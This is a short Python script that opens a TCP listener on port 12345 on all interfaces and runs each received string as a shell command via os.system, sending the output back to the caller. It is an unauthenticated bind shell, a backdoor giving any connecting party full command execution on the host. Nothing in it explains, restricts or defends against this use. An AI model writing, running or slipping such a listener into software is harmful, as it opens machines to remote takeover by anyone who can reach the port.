#!/usr/bin/python3

import socket
import os

port = 12345
connected = True

s = socket.socket()
s.bind(('', port))
try:
	while True:
		s.listen(5)
		c, addr = s.accept()
		print("Socket Up and running with a connection from ",addr)
		while connected:
			rcvdData = c.recv(1024).decode()
			if rcvdData=="bye":
				connected=False
				break
			else:
				print("Command: "+rcvdData)

				os.system(rcvdData+' > tmp')
				sendData = open('tmp','r').read()
				os.remove('tmp')
				print(sendData)

				c.send(sendData.encode())
		connected=True
except:
	c.close()
